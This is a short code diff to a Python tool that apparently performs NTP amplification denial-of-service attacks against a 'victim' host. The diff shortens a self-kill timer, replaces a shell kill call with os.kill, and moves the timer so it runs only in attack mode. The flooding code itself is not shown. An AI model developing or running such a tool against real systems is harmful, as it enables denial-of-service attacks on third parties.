@@ -1,7 +1,7 @@
 import os
 import time
+import signal
 import threading
-import subprocess
 import argparse
 import logging
 import random
@@ -145,19 +145,19 @@ def spawn_kill_me():
     """
     global kill_thread
     def kill_me():
-        time.sleep(60)
+        time.sleep(5)
         pid = os.getpid()
-        subprocess.check_output(["kill", "-s", "SIGKILL", str(pid)], shell=True)
+        os.kill(pid, signal.SIGKILL)
     kill_thread = threading.Thread(target=kill_me)
     kill_thread.start()
 
 if __name__ == '__main__':
     args = argument_parse()
     ntpamp = NTPAmp(args.fpath, args.victim, args.nthreads, args.sport, args.dport, args.warmup)
-    spawn_kill_me()
     if args.single:
         ntpamp.get_monlist()
     elif args.warmup:
         ntpamp.warmup()
     else:
+        spawn_kill_me()
         ntpamp.attack()
